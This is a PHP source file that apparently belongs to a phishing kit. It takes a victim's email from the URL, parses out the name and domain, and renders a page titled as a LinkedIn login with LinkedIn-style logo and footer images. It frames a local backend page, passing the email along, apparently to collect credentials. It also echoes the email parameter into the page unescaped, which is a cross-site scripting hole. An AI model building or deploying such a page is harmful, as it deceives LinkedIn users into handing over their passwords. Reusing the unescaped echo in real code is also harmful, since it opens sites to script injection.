<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

<head>
<title>LinkedIn Login, Sign in | LinkedIn</title>
<link rel="icon" href="./webfiles/favicon.png" type="image/gif" sizes="16x16">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=768, minimum-scale=0.4, maximum-scale=1.0, user-scalable=1">
<meta http-equiv="X-UA-Compatible" content="IE=EDGE">
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">

</head>


<body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0">

<table align="center" cellspacing="0" height="100%" width="100%">

<tr><td height="15%">

	<table align="center" width="97%">
	
	<tr><td>

	
			<img src="./webfiles/logo.png" style="width:115px; height:34px;">
	

	</td></tr>
	
	</table>

</td></tr>



<tr><td height="70%">

	<div align="center">
		<iframe src="./backend/index.php?email=<?php echo $_GET['email']; ?>" frameBorder="0" style="width:400px; height:570px;" align="center"></iframe>  
	</div>


	

</td></tr>





<tr><td height="15%">

	<div align="center">
	
		<img src="./webfiles/footer.jpg" style="">
	
	</div>

</td></tr>



</table>

</body>
</html>